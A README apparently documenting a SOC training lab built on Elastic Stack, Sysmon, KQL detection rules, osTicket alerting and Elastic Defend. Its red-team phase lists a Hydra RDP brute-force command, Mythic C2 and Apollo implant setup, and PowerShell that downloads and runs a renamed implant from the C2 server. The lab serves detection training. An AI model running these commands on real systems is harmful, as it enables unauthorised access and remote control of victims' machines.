# 🛡️ Elastic SOC Project

> A hands-on, end-to-end Security Operations Centre (SOC) lab built from scratch using the **Elastic Stack (ELK)**, **Elastic Agent**, **Sysmon**, **Mythic C2**, and **osTicket**. This repository documents every step — from infrastructure provisioning to attack simulation and incident investigation.

---

## 📋 Table of Contents

1. [Lab Overview](#-lab-overview)
2. [Architecture](#-architecture)
3. [Prerequisites](#-prerequisites)
4. [Phase 1 — Infrastructure Setup](#phase-1--infrastructure-setup)
   - [Elasticsearch Installation](#11-elasticsearch-installation)
   - [Kibana Deployment](#12-kibana-deployment)
   - [Firewall Configuration](#13-firewall-configuration)
5. [Phase 2 — Agent Deployment](#phase-2--agent-deployment)
   - [Fleet Server](#21-fleet-server)
   - [Windows Agent (SOC-WIN-JOP)](#22-windows-agent-soc-win-jop)
   - [Linux Agent (SOC-Linux-Jop)](#23-linux-agent-soc-linux-jop)
6. [Phase 3 — Sysmon & Data Ingestion](#phase-3--sysmon--data-ingestion)
   - [Sysmon Installation](#31-sysmon-installation)
   - [Windows Event Log Integration](#32-windows-event-log-integration)
7. [Phase 4 — Detection Engineering](#phase-4--detection-engineering)
   - [SSH Brute Force Alert](#41-ssh-brute-force-alert)
   - [RDP Brute Force Alert](#42-rdp-brute-force-alert)
   - [Dashboards](#43-dashboards)
8. [Phase 5 — Attack Simulation (Red Team)](#phase-5--attack-simulation-red-team)
   - [Mythic C2 Setup](#51-mythic-c2-setup)
   - [Apollo Agent & Payload](#52-apollo-agent--payload)
   - [Attack Execution](#53-attack-execution)
9. [Phase 6 — Ticketing Integration (osTicket)](#phase-6--ticketing-integration-osticket)
10. [Phase 7 — Investigation & Threat Hunting](#phase-7--investigation--threat-hunting)
11. [Phase 8 — Elastic EDR](#phase-8--elastic-edr)
12. [Screenshots Index](#-screenshots-index)
13. [KQL Query Reference](#-kql-query-reference)
14. [Lessons Learned](#-lessons-learned)

---

## 🔭 Lab Overview

This project simulates a real-world SOC environment where a **Blue Team** monitors and defends infrastructure while a **Red Team** executes attacks. The goal is to build detection capabilities, create dashboards, automate alerting, and investigate incidents end-to-end.

| Role       | Tooling                              |
|------------|--------------------------------------|
| Blue Team  | Elastic Stack, Sysmon, Elastic EDR   |
| Red Team   | Kali Linux, Hydra, Mythic C2, Apollo |
| Ticketing  | osTicket via Elastic Webhook         |

---

## 🏗️ Architecture

```
┌──────────────────────────────────────────────────────────┐
│                      Cloud Provider (VPC)                │
│                                                          │
│  ┌──────────────┐    ┌──────────────┐   ┌─────────────┐ │
│  │  MySoc-ELK   │    │  Fleet       │   │  Ticketing  │ │
│  │  Elasticsearch│◄──│  Server      │   │  (osTicket) │ │
│  │  + Kibana    │    │              │   │  + XAMPP    │ │
│  └──────┬───────┘    └──────┬───────┘   └──────┬──────┘ │
│         │                   │                   │        │
│  ┌──────▼───────┐    ┌──────▼───────┐           │        │
│  │  SOC-WIN-JOP │    │ SOC-Linux-Jop│           │        │
│  │  Windows     │    │  Ubuntu      │           │        │
│  │  (Target)    │    │  (Target)    │           │        │
│  └──────────────┘    └──────────────┘           │        │
│                                                  │        │
│  ┌──────────────┐                                │        │
│  │  Mythic C2   │─────── Attack ──────────────── ┘        │
│  │  Server      │                                          │
│  └──────────────┘                                          │
└──────────────────────────────────────────────────────────┘
         ▲
         │ Attacks from
  ┌──────┴────────┐
  │  Kali Linux   │
  │  (Attacker)   │
  └───────────────┘
```

**Servers used in this lab:**

| Instance        | OS      | Role                            | Port(s)        |
|-----------------|---------|----------------------------------|----------------|
| MySoc-ELK       | Ubuntu  | Elasticsearch + Kibana           | 9200, 5601     |
| Fleet Server    | Ubuntu  | Elastic Fleet / Agent management | 8220           |
| SOC-WIN-JOP     | Windows | Target (victim) machine          | 3389 (RDP)     |
| SOC-Linux-Jop   | Ubuntu  | Linux target + SSH brute target  | 22             |
| Mythic Server   | Ubuntu  | C2 framework (red team)          | 7443, 80, 9999 |
| Ticketing       | Windows | osTicket helpdesk                | 80             |

---

## ✅ Prerequisites

- A cloud account (Vultr, AWS, DigitalOcean, etc.)
- Basic Linux CLI knowledge
- A local Kali Linux VM (VMware or VirtualBox)
- Ports knowledge: SSH (22), Kibana (5601), Elasticsearch (9200), Fleet (8220), Mythic (7443)

---

## Phase 1 — Infrastructure Setup

### 1.1 Elasticsearch Installation

**Step 1 — Download Elasticsearch via `wget`:**

```bash
# Download the Elasticsearch .deb package for Ubuntu/Debian
wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.x.x-amd64.deb
```

**Step 2 — Install the package:**

```bash
# Install the downloaded package using dpkg
sudo dpkg -i elasticsearch-8.x.x-amd64.deb
```

> 💡 **Critical:** During installation, Elastic will print a **Security autoconfiguration block** — save this immediately. It contains the auto-generated password for the `elastic` superuser. Example output:

```
━━━━━━━━━━━━━━ Security autoconfiguration information ━━━━━━━━━━━━━━

Authentication and authorization are enabled.
TLS for the transport and HTTP layers is enabled and configured.

The generated password for the elastic built-in superuser is:
  8Nf2r2fYW-YLSAhyybNP    ← SAVE THIS

You can reset it later with:
  /usr/share/elasticsearch/bin/elasticsearch-reset-password -u elastic

Generate a Kibana enrollment token with:
  /usr/share/elasticsearch/bin/elasticsearch-create-enrollment-token -s kibana

Generate a node enrollment token with:
  /usr/share/elasticsearch/bin/elasticsearch-create-enrollment-token -s node
```

📸 *See:* [`screenshots/01-elasticsearch-install.png`](screenshots/README.md#01---elasticsearch-installation)

**Step 3 — Configure `elasticsearch.yml`:**

```bash
# Open the Elasticsearch configuration file
sudo nano /etc/elasticsearch/elasticsearch.yml
```

Key settings to configure:

```yaml
# Bind Elasticsearch to the server's internal/public IP (not just localhost)
# This allows Kibana and agents to reach it over the network
network.host: 0.0.0.0

# The HTTP port Elasticsearch listens on (default: 9200)
http.port: 9200

# Cluster name — give it something meaningful
cluster.name: soc-lab-cluster

# Node name for this instance
node.name: soc-elk-node1
```

📸 *See:* [`screenshots/02-elasticsearch-config.png`](screenshots/README.md#02---elasticsearch-configuration)

**Step 4 — Enable and start Elasticsearch:**

```bash
# Enable Elasticsearch to start automatically on boot
sudo systemctl enable elasticsearch

# Start the service now
sudo systemctl start elasticsearch

# Verify it is running — look for "active (running)"
sudo systemctl status elasticsearch
```

---

### 1.2 Kibana Deployment

**Step 1 — Download and install Kibana:**

```bash
# Download the Kibana .deb package (must match Elasticsearch version)
wget https://artifacts.elastic.co/downloads/kibana/kibana-8.x.x-amd64.deb

# Install it
sudo dpkg -i kibana-8.x.x-amd64.deb
```

**Step 2 — Configure `kibana.yml`:**

```bash
sudo nano /etc/kibana/kibana.yml
```

```yaml
# The port Kibana listens on (default: 5601)
server.port: 5601

# Bind Kibana to all interfaces so it's reachable from a browser
server.host: "0.0.0.0"

# The Elasticsearch URL Kibana will connect to
elasticsearch.hosts: ["https://YOUR_SERVER_IP:9200"]
```

**Step 3 — Generate an enrollment token to link Kibana to Elasticsearch:**

```bash
# This token authorizes Kibana to communicate securely with Elasticsearch
/usr/share/elasticsearch/bin/elasticsearch-create-enrollment-token -s kibana
```

> Copy the token printed to the terminal — you will paste it into Kibana's web UI during first setup.

📸 *See:* [`screenshots/03-kibana-token.png`](screenshots/README.md#03---kibana-enrollment-token)

**Step 4 — Start Kibana and open the UI:**

```bash
sudo systemctl enable kibana
sudo systemctl start kibana
```

Navigate to `http://YOUR_SERVER_IP:5601` in your browser.

📸 *See:* [`screenshots/04-kibana-login.png`](screenshots/README.md#04---kibana-login-page)

**Step 5 — Configure the Kibana keystore (encryption keys):**

Kibana requires three encryption keys for saved objects, reporting, and security. Generate them and add to the keystore:

```bash
# Generate the keys (Kibana will suggest these or you generate random 32-byte hex values)
# Example keys (use your own):
# xpack.encryptedSavedObjects.encryptionKey: 6010bde7634060a5...
# xpack.reporting.encryptionKey: b10b65397c66811b...
# xpack.security.encryptionKey: 88f3f0b3450a4f61...

# Add each key to the secure keystore (avoids plain-text secrets in kibana.yml)
sudo /usr/share/kibana/bin/kibana-keystore add xpack.encryptedSavedObjects.encryptionKey
sudo /usr/share/kibana/bin/kibana-keystore add xpack.reporting.encryptionKey
sudo /usr/share/kibana/bin/kibana-keystore add xpack.security.encryptionKey

# Restart Kibana to apply the keystore changes
sudo systemctl restart kibana
```

> ✅ After restart, all feature warnings in Kibana should be resolved.

---

### 1.3 Firewall Configuration

> ⚠️ **Security note:** Always restrict SSH access to **your own IP address only**. Never expose port 22 to `0.0.0.0/0`.

Configure the cloud provider firewall with the following rules:

| Protocol | Port      | Source            | Purpose                            |
|----------|-----------|-------------------|------------------------------------|
| TCP      | 22        | Your IP only      | SSH management access              |
| TCP      | 9200      | Internal VPC      | Elasticsearch API                  |
| TCP      | 5601      | Your IP only      | Kibana web UI                      |
| TCP      | 8220      | Internal VPC      | Fleet Server (Agent enrollment)    |
| TCP      | 1–65535   | Your IP only      | Temporary broad rule for testing   |

📸 *See:* [`screenshots/05-firewall-rules.png`](screenshots/README.md#05---firewall-rules)

---

## Phase 2 — Agent Deployment

### 2.1 Fleet Server

The **Fleet Server** is a dedicated instance that manages all Elastic Agents. It acts as a relay between Elasticsearch and the agents deployed on monitored machines.

1. In Kibana → **Management → Fleet → Settings** → Add a Fleet Server host.
2. Select **Quick Start** mode for lab purposes.
3. Copy the generated install command and run it on your Fleet Server instance.

📸 *See:* [`screenshots/06-fleet-server-setup.png`](screenshots/README.md#06---fleet-server-setup)

---

### 2.2 Windows Agent (SOC-WIN-JOP)

Install the Elastic Agent on the Windows target machine using **PowerShell**:

```powershell
# Step 1 — Suppress download progress bar for faster download
$ProgressPreference = 'SilentlyContinue'

# Step 2 — Download the Elastic Agent zip for Windows x86_64
Invoke-WebRequest `
  -Uri "https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-9.4.1-windows-x86_64.zip" `
  -OutFile "elastic-agent.zip"

# Step 3 — Extract the zip to a local directory
Expand-Archive .\elastic-agent.zip -DestinationPath C:\Users\Administrator\elastic-agent

# Step 4 — Navigate to the extracted directory
cd C:\Users\Administrator\elastic-agent\elastic-agent-9.4.1-windows-x86_64

# Step 5 — Install the agent and enroll it with the Fleet Server
# --url        : The Fleet Server URL (your fleet server IP on port 8220)
# --enrollment-token : Token generated in Kibana for this policy
# --insecure   : Skips TLS verification (OK for lab; use proper certs in production)
.\elastic-agent.exe install `
  --url=https://YOUR_FLEET_SERVER_IP:8220 `
  --enrollment-token=YOUR_ENROLLMENT_TOKEN `
  --insecure
```

📸 *See:* [`screenshots/07-windows-agent-install.png`](screenshots/README.md#07---windows-agent-installation)

---

### 2.3 Linux Agent (SOC-Linux-Jop)

Create a second Fleet policy in Kibana for Linux, then run on the Ubuntu target:

```bash
# Step 1 — Download the Linux Elastic Agent tarball
curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-9.4.1-linux-x86_64.tar.gz

# Step 2 — Extract the archive
tar xzvf elastic-agent-9.4.1-linux-x86_64.tar.gz

# Step 3 — Change into the extracted directory
cd elastic-agent-9.4.1-linux-x86_64

# Step 4 — Install and enroll the agent with the Fleet Server
# Same flags as Windows: url, enrollment-token, insecure
sudo ./elastic-agent install \
  --url=https://YOUR_FLEET_SERVER_IP:8220 \
  --enrollment-token=YOUR_LINUX_ENROLLMENT_TOKEN \
  --insecure
```

> ✅ Verify both agents appear as **Healthy** in Kibana → Fleet → Agents.

📸 *See:* [`screenshots/08-linux-agent-install.png`](screenshots/README.md#08---linux-agent-installation)

---

## Phase 3 — Sysmon & Data Ingestion

### 3.1 Sysmon Installation

**Sysmon** (System Monitor) is a Windows system service that logs detailed process creation, network connections, and file operations — far richer than default Windows event logs.

**Step 1 — Download Sysmon from Microsoft Sysinternals:**

```
https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
```

**Step 2 — Download the SwiftOnSecurity Sysmon config (community hardened config):**

```
https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml
```

> This config file (maintained by Olaf Hartong / SwiftOnSecurity) defines which events Sysmon captures, filtering out noise and focusing on what matters for threat detection.

**Step 3 — Install Sysmon with the config:**

```powershell
# Move to the directory where you saved both Sysmon.exe and sysmonconfig.xml
cd C:\Tools\Sysmon

# Install Sysmon as a Windows service with the custom config
# -i  : Install (first time)
# -accepteula : Auto-accept the EULA
.\Sysmon64.exe -accepteula -i .\sysmonconfig.xml
```

**Step 4 — Verify Sysmon is running:**

```
Services.msc          → Look for "Sysmon64"
Event Viewer          → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational
```

📸 *See:* [`screenshots/09-sysmon-install.png`](screenshots/README.md#09---sysmon-installation)
📸 *See:* [`screenshots/10-sysmon-event-viewer.png`](screenshots/README.md#10---sysmon-event-viewer)

---

### 3.2 Windows Event Log Integration

In Kibana → **Fleet → Agent Policy → Add Integration → Windows**:

Add the following **custom channels** to ingest:

| Channel Name (from Event Viewer)            | Event IDs      | Purpose                                |
|---------------------------------------------|----------------|----------------------------------------|
| `Microsoft-Windows-Sysmon/Operational`      | All            | Process, network, file events          |
| `Microsoft-Windows-Windows Defender/Operational` | 1116, 1117, 5001 | Defender detections & disables   |

> To find the exact channel name: open **Event Viewer → right-click log → Properties → Full Name**

📸 *See:* [`screenshots/11-event-log-integration.png`](screenshots/README.md#11---windows-event-log-integration)
📸 *See:* [`screenshots/12-defender-integration.png`](screenshots/README.md#12---defender-event-integration)

---

## Phase 4 — Detection Engineering

### 4.1 SSH Brute Force Alert

**KQL Query — detect failed SSH authentication events:**

```kql
system.auth.ssh.event: "Failed"
  and agent.name: "SOC-Linux-Jop"
```

> This filters the `system.auth` data stream for SSH login failures specifically on the Linux target agent.

**Dashboard fields to add:**

- `source.ip` — attacker IP address
- `source.geo.country_name` — country of origin
- `user.name` — targeted username
- `system.auth.ssh.event` — Failed / Accepted

**Alert configuration:**

- **Type:** Threshold
- **Threshold:** 5 failed attempts within 5 minutes
- **Group by:** `source.ip`, `user.name`

📸 *See:* [`screenshots/13-ssh-alert-config.png`](screenshots/README.md#13---ssh-brute-force-alert)
📸 *See:* [`screenshots/14-ssh-map-dashboard.png`](screenshots/README.md#14---ssh-brute-force-map-dashboard)

---

### 4.2 RDP Brute Force Alert

**KQL Query — detect failed RDP logon attempts (Event ID 4625):**

```kql
event.code: "4625"
  and agent.name: "SOC-WIN-JOP"
```

> Windows Event ID `4625` = "An account failed to log on." This is the primary signal for brute force against RDP (port 3389).

**KQL Query — detect successful RDP logons (Event ID 4624):**

```kql
event.code: "4624"
  and agent.name: "SOC-WIN-JOP"
  and (
    winlog.event_data.LogonType: "10"   // Remote Interactive (RDP)
    or winlog.event_data.LogonType: "7" // Unlock
  )
```

> `LogonType 10` = RemoteInteractive (RDP session). Filtering on this avoids noise from local logons.

📸 *See:* [`screenshots/15-rdp-alert.png`](screenshots/README.md#15---rdp-brute-force-alert)
📸 *See:* [`screenshots/16-rdp-dashboard.png`](screenshots/README.md#16---rdp-activity-dashboard)

---

### 4.3 Dashboards

#### SSH Brute Force Map Dashboard

1. **Kibana → Maps → Create new map**
2. Paste SSH query → Add Layer → **Administrative Boundaries → World Countries**
3. Join field: `source.geo.country_iso_code`
4. Save as: `SSH Brute Force — Source Countries`

#### RDP Activity Dashboard

Panels to add in **Analytics → Dashboards → Create visualization**:

| Panel | Query | Fields |
|-------|-------|--------|
| Failed RDP logons table | `event.code: "4625"` | `source.ip`, `user.name`, `timestamp` |
| Successful RDP logons | `event.code: "4624" and winlog.event_data.LogonType: 10` | `source.ip`, `user.name` |
| Top attacker countries | `event.code: "4625"` | `source.geo.country_name` |

📸 *See:* [`screenshots/17-rdp-map.png`](screenshots/README.md#17---rdp-map)
📸 *See:* [`screenshots/18-rdp-tables.png`](screenshots/README.md#18---rdp-tables)

---

## Phase 5 — Attack Simulation (Red Team)

> ⚠️ **Legal disclaimer:** All attacks are performed in a self-controlled lab environment. Never use these techniques against systems you do not own or have explicit written permission to test.

### 5.1 Mythic C2 Setup

**Mythic** is an open-source Command & Control (C2) framework used by penetration testers to manage implants on compromised machines.

**Step 1 — Install Docker and dependencies on the Mythic server (Ubuntu):**

```bash
# Install Docker Compose (required to orchestrate Mythic's containers)
apt install docker-compose -y

# Install make (used to build Mythic)
apt install make -y
```

**Step 2 — Clone the Mythic repository:**

```bash
# Download Mythic from GitHub
git clone https://github.com/its-a-feature/Mythic
cd Mythic
```

**Step 3 — Install Docker for Ubuntu (Mythic's helper script):**

```bash
# This script installs the correct Docker version for Ubuntu
./install_docker_ubuntu.sh

# Restart Docker after the script finishes
systemctl restart docker
```

**Step 4 — Build and start Mythic:**

```bash
# Build all Mythic containers
make

# Start all Mythic services
./mythic-cli start
```

**Step 5 — Access the Mythic web UI:**

```
https://YOUR_MYTHIC_SERVER_IP:7443
```

> Default credentials are stored in the `.env` file in the Mythic directory: `cat .env | grep MYTHIC_ADMIN`

📸 *See:* [`screenshots/19-mythic-install.png`](screenshots/README.md#19---mythic-c2-installation)
📸 *See:* [`screenshots/20-mythic-ui.png`](screenshots/README.md#20---mythic-web-ui)

---

### 5.2 Apollo Agent & Payload

**Apollo** is a Windows Elastic agent for Mythic (C2 implant). It runs on the victim machine and calls back to the Mythic server.

**Step 1 — Install the Apollo agent plugin:**

```bash
# Install Apollo from the official MythicAgents GitHub
./mythic-cli install github https://github.com/MythicAgents/Apollo.git
```

**Step 2 — Install the HTTP C2 profile (communication channel):**

```bash
# Install the HTTP C2 profile so Apollo communicates over HTTP
./mythic-cli install github https://github.com/MythicC2Profiles/http
```

**Step 3 — Create a payload in the Mythic UI:**

- **Agent:** Apollo
- **OS:** Windows x64
- **C2 Profile:** HTTP
- **Callback host:** `http://YOUR_MYTHIC_SERVER_IP`
- **Commands:** include all available

**Step 4 — Serve the payload via a Python HTTP server:**

```bash
# Host the payload file so the victim machine can download it
python3 -m http.server 9999

# Allow inbound traffic on port 9999 through UFW
ufw allow 9999

# Also allow port 80 for HTTP callbacks
ufw allow 80
```

📸 *See:* [`screenshots/21-apollo-payload.png`](screenshots/README.md#21---apollo-payload-creation)

---

### 5.3 Attack Execution

**Step 1 — RDP Brute Force with Hydra (from Kali Linux):**

```bash
# Hydra is a fast login cracker supporting many protocols including RDP
# -l Administrator     : single username to try
# -P SOCLab-wordlist   : password list (based on rockyou.txt with target password added)
# rdp://TARGET_IP      : protocol and target
# -t 1                 : 1 thread (RDP is fragile with many parallel connections)
# -W 5                 : wait 5 seconds between attempts
# -f                   : stop after first successful login
# -V                   : verbose — print each attempt
hydra -l Administrator -P SOCLab-wordlist.txt rdp://TARGET_WINDOWS_IP -t 1 -W 5 -f -V
```

**Step 2 — Connect via RDP from Kali after discovering the password:**

```bash
# xfreerdp is a free RDP client available on Kali Linux
# /v : target IP
# /u : username
# /p : password found by Hydra
xfreerdp /v:TARGET_WINDOWS_IP /u:Administrator /p:DISCOVERED_PASSWORD
```

**Step 3 — Perform reconnaissance commands on the victim machine (via RDP session):**

```cmd
whoami          :: Confirms current user context
ipconfig        :: Reveals network configuration and IPs
net user        :: Lists all local user accounts
net group       :: Lists all local groups
```

**Step 4 — Download and execute the Mythic payload (from RDP session in PowerShell):**

```powershell
# Download the Apollo payload from the Mythic server's HTTP server
# Replace the IP with your Mythic server's public IP
Invoke-WebRequest `
  -Uri "http://YOUR_MYTHIC_SERVER_IP:9999/svchost-jop.exe" `
  -OutFile "C:\Users\Public\Downloads\svchost-jop.exe"

# Execute the payload — this triggers the C2 callback to Mythic
C:\Users\Public\Downloads\svchost-jop.exe
```

**Step 5 — Verify the C2 connection:**

```cmd
# Confirm the implant established a network connection back to Mythic
netstat -anob
# Look for an ESTABLISHED connection to YOUR_MYTHIC_SERVER_IP on port 80
```

📸 *See:* [`screenshots/22-hydra-attack.png`](screenshots/README.md#22---hydra-rdp-brute-force)
📸 *See:* [`screenshots/23-rdp-from-kali.png`](screenshots/README.md#23---rdp-session-from-kali)
📸 *See:* [`screenshots/24-mythic-callback.png`](screenshots/README.md#24---mythic-c2-callback)

---

## Phase 6 — Ticketing Integration (osTicket)

**osTicket** is an open-source helpdesk system. We integrate it with Elastic so that alerts automatically create support tickets.

### 6.1 osTicket Setup (Windows + XAMPP)

**Step 1 — Install XAMPP** (Apache + MySQL + PHP for Windows)

```
Download from: https://www.apachefriends.org/
```

**Step 2 — Configure `httpd.conf`** inside XAMPP:

```apache
# Set the server's public IP as the domain name
apache_domainname=YOUR_PUBLIC_IP
```

**Step 3 — Configure phpMyAdmin** for remote access:

Edit `C:\xampp\phpMyAdmin\config.inc.php`:

```php
// Allow connections from the server's public IP (not just localhost)
$cfg['Servers'][$i]['host'] = 'YOUR_PUBLIC_IP';
```

**Step 4 — Create a dedicated MySQL user for osTicket** in phpMyAdmin → User Accounts:

- Host: set to your public IP
- Grant all privileges on the `osticket` database

**Step 5 — Download and install osTicket:**

```
https://osticket.com/editions/  → Self-Hosted → Free
```

- Extract to `C:\xampp\htdocs\osticket\`
- Navigate to `http://YOUR_PUBLIC_IP/osticket/upload/setup/` to complete setup

📸 *See:* [`screenshots/25-osticket-setup.png`](screenshots/README.md#25---osticket-setup)
📸 *See:* [`screenshots/26-osticket-portal.png`](screenshots/README.md#26---osticket-portal)

---

### 6.2 Elastic → osTicket Webhook Integration

**Step 1 — Generate an osTicket API key:**

- osTicket Admin Panel → **Manage → API → New API Key**
- Set source IP to the **private IP** of your ELK instance (since both are in the same VPC)

**Step 2 — Create a Webhook Connector in Kibana:**

- Kibana → **Management → Alerts and Insights → Connectors → Create Connector → Webhook**

```
URL:    http://YOUR_OSTICKET_PRIVATE_IP/osticket/upload/api/tickets.json
Method: POST
Headers:
  Content-Type: application/json
  X-API-Key: YOUR_OSTICKET_API_KEY
```

**Step 3 — Test using the osTicket API payload template:**

Reference: `https://github.com/osTicket/osTicket/blob/develop/setup/doc/api/tickets.md`

```json
{
  "alert": true,
  "autorespond": true,
  "source": "API",
  "name": "Elastic Alert",
  "email": "soc@yourdomain.com",
  "subject": "{{rule.name}}",
  "message": "Alert triggered at {{date}}\n\nDetails: {{context.message}}"
}
```

📸 *See:* [`screenshots/27-webhook-connector.png`](screenshots/README.md#27---elastic-webhook-connector)
📸 *See:* [`screenshots/28-osticket-ticket.png`](screenshots/README.md#28---auto-generated-ticket)

---

## Phase 7 — Investigation & Threat Hunting

### 7.1 SSH Brute Force Investigation

**Query to find all failed SSH attempts from a suspicious IP:**

```kql
system.auth.ssh.event: "Failed"
  and source.ip: "SUSPICIOUS_IP"
  and agent.name: "SOC-Linux-Jop"
```

**Check if the IP ever successfully authenticated:**

```kql
system.auth.ssh.event: "Accepted"
  and source.ip: "SUSPICIOUS_IP"
```

> Use [AbuseIPDB](https://www.abuseipdb.com) to check if the IP is a known malicious actor.

---

### 7.2 Mythic C2 Detection & Hunting

**Query — Detect suspicious process creation (Sysmon Event ID 1):**

```kql
event.code: "1"
  and event.provider: "Microsoft-Windows-Sysmon"
  and (powershell or cmd or rundll32)
```

**Query — Detect outbound network connections (Sysmon Event ID 3):**

```kql
event.code: "3"
  and event.provider: "Microsoft-Windows-Sysmon"
  and winlog.event_data.Initiated: "true"
```

> Event ID 3 logs every outbound network connection initiated by a process — critical for detecting C2 beaconing.

**Query — Detection rule for Apollo C2 implant (by hash):**

```kql
event.code: "1"
  and winlog.event_data.OriginalFileName: "Apollo.exe"
  and winlog.event_data.Hashes: *B922E4A7C639E697D4AA06196E4DDE56CAF49CC4837F253228237EF46A285F90*
```

> Sysmon logs the **original PE file name** embedded in the executable, even if the attacker renamed it. This makes hash + original name a reliable IOC.

**Query — Windows Defender disabled (Event ID 5001):**

```kql
event.code: "5001"
  and event.provider: "Microsoft-Windows-Windows Defender"
```

📸 *See:* [`screenshots/29-c2-hunting.png`](screenshots/README.md#29---mythic-c2-hunting)
📸 *See:* [`screenshots/30-c2-timeline.png`](screenshots/README.md#30---attack-timeline)

---

## Phase 8 — Elastic EDR

**Elastic Defend** (EDR) provides endpoint detection and response capabilities — including real-time malware prevention.

**Step 1 — Add Elastic Defend integration:**

- Kibana → **Management → Integrations → Elastic Defend**
- Add to the Windows agent policy
- Set **Protection level: Prevent** (not just detect)

**Step 2 — Isolate a compromised host:**

- Kibana → **Security → Manage → Endpoints**
- Select the host → **Isolate Host**
- This cuts off the host's network connectivity except to the Elastic stack

**Step 3 — Verify malware prevention:**

When the Apollo payload is re-executed, Elastic Defend will block it and generate a prevention alert.

**KQL — Check the prevention log:**

```kql
event.action: "prevention"
  and agent.name: "SOC-WIN-JOP"
```

📸 *See:* [`screenshots/31-edr-prevention.png`](screenshots/README.md#31---edr-malware-prevention)
📸 *See:* [`screenshots/32-edr-alert.png`](screenshots/README.md#32---edr-alert-detail)

---

## 📸 Screenshots Index

All screenshots are stored in the [`/screenshots`](./screenshots/) folder. See [`screenshots/README.md`](./screenshots/README.md) for the full annotated index with descriptions of what each screenshot shows.

---

## 📋 KQL Query Reference

All detection queries are collected in [`queries/detection-queries.md`](./queries/detection-queries.md) for easy copy-paste reference.

---

## 💡 Lessons Learned

1. **Always save the Elasticsearch security autoconfiguration output** — losing the auto-generated password requires a full reset procedure.
2. **Firewall rules are critical** — restrict SSH to your IP only from day one.
3. **Sysmon dramatically enriches Windows telemetry** — default Windows event logs alone miss most attacker activity.
4. **The original PE filename (Sysmon Event 1) survives renaming** — attackers cannot easily evade this without modifying the PE header.
5. **Fleet Server separation matters** — running Fleet on a dedicated instance avoids resource contention with Elasticsearch.
6. **osTicket + Elasticsearch webhook** closes the loop between detection and response workflows.
7. **EDR prevention vs detection** — detection tells you something happened; prevention stops it before it runs.

---

## 📁 Repository Structure

```
elastic-soc-lab/
├── README.md                        ← This file
├── screenshots/
│   └── README.md                    ← Annotated screenshots index
├── queries/
│   └── detection-queries.md         ← All KQL queries in one place
├── alerts/
│   └── alert-configs.md             ← Alert rule configurations
└── dashboards/
    └── dashboard-guide.md           ← Dashboard setup guide
```

---

## 📜 License

This project is for educational purposes only. All attacks were performed in a self-owned lab environment.

---

*Built with ❤️ during the Elastic 30-Day SOC Challenge*
